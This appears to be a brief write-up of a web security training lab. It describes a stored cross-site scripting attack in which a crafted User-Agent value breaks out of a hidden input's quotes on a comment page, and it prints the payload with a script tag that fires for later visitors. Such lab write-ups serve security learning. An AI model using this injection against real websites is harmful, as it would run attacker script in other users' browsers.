I was able to solve the lab, as the value of the user agent was shown in the comment page as:
<input required type="hidden" name="userAgent" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36">

by using my POST method it will break out of the user agent values quotes and provide a script tag to fire in the html.

broken out quotes of the user agent:
<input required type="hidden" name="userAgent" value="a"/><script>alert(1)</script>">



Then the next user would be hit with the script tag when loading the comment section for post 5
